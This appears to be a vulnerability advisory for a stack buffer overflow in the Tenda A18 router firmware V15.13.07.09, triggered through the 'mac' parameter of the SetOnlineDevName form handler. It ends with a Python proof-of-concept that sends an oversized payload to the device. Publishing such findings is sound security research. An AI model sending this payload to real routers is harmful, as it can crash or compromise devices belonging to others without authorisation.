## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/download/detail-2760.html

## Affected version

V15.13.07.09

## Vulnerability details

The Tenda A18 V15.13.07.09 has a stack overflow vulnerability located in the `formSetDeviceName` function. This function accepts the `mac` parameter from a POST request by `dev_id` variable and passes it to the `set_device_name` function. 

![image-20240307202242332](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307202242332.png)

Within `set_device_name`, the array `mib_vlaue` is fixed at 256 bytes. However, since the user has control over the input of `mac`, the statement `sprintf(mib_name, "client.devicename%s", dev_mac);` leads to a buffer overflow. The user-supplied `mac` can exceed the capacity of the `mib_vlaue` array, thus triggering this security vulnerability.

![image-20240307202326575](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307202326575.png)

![image-20240307202335791](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307202335791.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*1000

data = {"mac": payload,"devName": 1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240307202532447](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240307202532447.png)